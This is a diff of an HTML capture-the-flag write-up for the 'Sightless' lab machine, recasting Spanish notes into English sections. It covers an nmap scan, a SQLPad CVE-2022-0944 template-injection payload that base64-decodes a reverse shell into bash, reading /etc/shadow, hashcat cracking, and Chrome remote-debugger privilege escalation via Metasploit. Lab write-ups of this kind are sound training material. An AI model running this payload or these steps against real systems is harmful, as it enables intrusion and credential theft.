@@ -7,6 +7,78 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>Sightless</h1><br/><p>Escaneo de puertos </p><p></p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN sightless_scan 10.10.11.32</strong></p><p></p><p><img src="images/127-1.png" alt="images/127-1.png" /></p><p></p><p>Encuentro este subdominio en un button</p><p></p><p>	<strong>sqlpad.sightless.htb</strong></p><p>	</p><p><img src="images/127-2.png" alt="images/127-2.png" /></p><p></p><p>Para acceder al servicio FTP necesito SSL (Secure Socket Layer)</p><p></p><p><img src="images/127-3.png" alt="images/127-3.png" /></p><p></p><p>Encuentro la versión de SQLPad</p><p></p><p>	<img src="images/127-4.png" alt="images/127-4.png" /></p><p>	</p><p>CVE-2022-0944 - Docker Shell</p><p></p><p><img src="images/127-5.png" alt="images/127-5.png" /></p><p></p><p>Introducimos en database el reverse shell en base 64 </p><p></p><p><img src="images/127-6.png" alt="images/127-6.png" />	</p><p>	</p><p>	{{ process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo reverse_encoded=|</p><p>	 base64 -d|bash&#39;) }}</p><p></p><p>En new connection introducimos los parámetros</p><p></p><p><img src="images/127-7.png" alt="images/127-7.png" /></p><p></p><p><img src="images/127-8.png" alt="images/127-8.png" /></p><p></p><p><img src="images/127-9.png" alt="images/127-9.png" /></p><p></p><p><img src="images/127-10.png" alt="images/127-10.png" /></p><p></p><p>Obtenemos el reverse y estamos como root</p><p></p><p><img src="images/127-11.png" alt="images/127-11.png" /></p><p></p><p>En el directorio home tenemos 2 users</p><p></p><p><img src="images/127-12.png" alt="images/127-12.png" /></p><p></p><p>Tras hacer footprint veo que puedo ver el archivo shadow y el archivo shadow</p><p>Por lo que puedo  intentar crackear las contraseñas  del usuario Michael</p><p></p><p><img src="images/127-13.png" alt="images/127-13.png" /></p><p></p><p><img src="images/127-14.png" alt="images/127-14.png" /></p><p></p><p>Con  hashcat lo crackeo y consigo la pass del user michael</p><p></p><p>	<strong>hashcat -m 1800 -a 0 shadow-hash.txt /usr/share/wordlists/rockyou.txt</strong></p><p></p><p>Con la contraseña y el usuario podemos acceder como usuario a través de ssh</p><p></p><p><img src="images/127-15.png" alt="images/127-15.png" /></p><p></p><p>Tenemos el usuario john</p><p></p><p>Pasamos linpeas.sh para buscar una escalada de privilegios </p><p></p><p>Vemos los procesos que se ejecutan como el usuario john </p><p></p><p><img src="images/127-16.png" alt="images/127-16.png" /></p><p></p><p><img src="images/127-17.png" alt="images/127-17.png" /></p><p></p><p>Tiene el parámetro --remote-debugging-port=0 por lo que el puerto se pone al azar</p><p></p><p>Usaré el proceso home/john/automation/chromedriver --port=51801</p><p></p><p>Según esto hay que hacer un portforwarding</p><p></p><p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/">Chrome Remote Debugger Pentesting | Exploit Notes (hdks.org)</a></p><p></p><p><img src="images/127-18.png" alt="images/127-18.png" /></p><p></p><p>Ahora se pasará a un puerto random</p><p></p><p><img src="images/127-19.png" alt="images/127-19.png" /></p><p></p><p>Usaremos Metasploit para hacer debugging</p><p></p><p></p><p></p><p><img src="images/127-20.png" alt="images/127-20.png" /></p><p></p><p></p><p></p></div>
+<div class="page">
+
+<h1 class="title">Sightless</h1>
+
+<section>
+<h2>Reconnaissance</h2>
+<p>The initial phase began with a full TCP port scan to identify exposed services on the target machine.</p>
+<pre><code>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN sightless_scan 10.10.11.32</code></pre>
+<p><img src="images/127-1.png" alt="images/127-1.png" /></p>
+<p>During the initial web interaction, a button revealed the presence of a subdomain.</p>
+<p><strong>sqlpad.sightless.htb</strong></p>
+<p><img src="images/127-2.png" alt="images/127-2.png" /></p>
+</section>
+
+<section>
+<h2>Enumeration</h2>
+<p>Further service analysis showed that accessing the FTP service required SSL, indicating a secured configuration.</p>
+<p><img src="images/127-3.png" alt="images/127-3.png" /></p>
+<p>By navigating to the discovered subdomain, the version of SQLPad in use was identified.</p>
+<p><img src="images/127-4.png" alt="images/127-4.png" /></p>
+<p>The application was found to be vulnerable to <strong>CVE-2022-0944</strong>, which allows command execution through a Docker shell escape.</p>
+<p><img src="images/127-5.png" alt="images/127-5.png" /></p>
+</section>
+
+<section>
+<h2>Exploitation</h2>
+<p>To exploit the vulnerability, a reverse shell payload was prepared and encoded in Base64.</p>
+<p>This payload was injected into the database connection field within SQLPad.</p>
+<p><img src="images/127-6.png" alt="images/127-6.png" /></p>
+<pre><code>{{ process.mainModule.require('child_process').exec('echo reverse_encoded=| base64 -d|bash') }}</code></pre>
+<p>A new database connection was then configured with the required parameters to trigger execution.</p>
+<p><img src="images/127-7.png" alt="images/127-7.png" /></p>
+<p><img src="images/127-8.png" alt="images/127-8.png" /></p>
+<p><img src="images/127-9.png" alt="images/127-9.png" /></p>
+<p><img src="images/127-10.png" alt="images/127-10.png" /></p>
+<p>The payload executed successfully, resulting in a reverse shell running as the root user.</p>
+<p><img src="images/127-11.png" alt="images/127-11.png" /></p>
+</section>
+
+<section>
+<h2>Post-Exploitation Analysis</h2>
+<p>Inside the system, two user accounts were identified within the home directory.</p>
+<p><img src="images/127-12.png" alt="images/127-12.png" /></p>
+<p>After performing local footprinting, it was discovered that sensitive files such as <code>/etc/passwd</code> and <code>/etc/shadow</code> were readable.</p>
+<p>This made it possible to extract password hashes for offline cracking.</p>
+<p><img src="images/127-13.png" alt="images/127-13.png" /></p>
+<p><img src="images/127-14.png" alt="images/127-14.png" /></p>
+<p>The password hash belonging to the user <code>michael</code> was cracked using hashcat.</p>
+<pre><code>hashcat -m 1800 -a 0 shadow-hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+<p>With valid credentials recovered, SSH access as <code>michael</code> was obtained.</p>
+<p><img src="images/127-15.png" alt="images/127-15.png" /></p>
+<p>Another user named <code>john</code> was also present on the system.</p>
+</section>
+
+<section>
+<h2>Privilege Escalation</h2>
+<p>To identify potential privilege escalation vectors, <code>linpeas.sh</code> was executed.</p>
+<p>The enumeration revealed processes running under the context of the user <code>john</code>.</p>
+<p><img src="images/127-16.png" alt="images/127-16.png" /></p>
+<p><img src="images/127-17.png" alt="images/127-17.png" /></p>
+<p>One of the processes was running Chrome with the <code>--remote-debugging-port=0</code> parameter, causing the debugging port to be assigned dynamically.</p>
+<p>The process <code>/home/john/automation/chromedriver --port=51801</code> was identified as a viable target.</p>
+<p>Based on this behavior, port forwarding was required to interact with the debugging interface.</p>
+<p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/">Chrome Remote Debugger Pentesting | Exploit Notes (hdks.org)</a></p>
+<p><img src="images/127-18.png" alt="images/127-18.png" /></p>
+<p>The debugging service was observed to bind to a random port.</p>
+<p><img src="images/127-19.png" alt="images/127-19.png" /></p>
+<p>Metasploit was then used to attach to the Chrome remote debugger and interact with the running process.</p>
+<p><img src="images/127-20.png" alt="images/127-20.png" /></p>
+</section>
+
+</div>
 </body>
+
 </html>
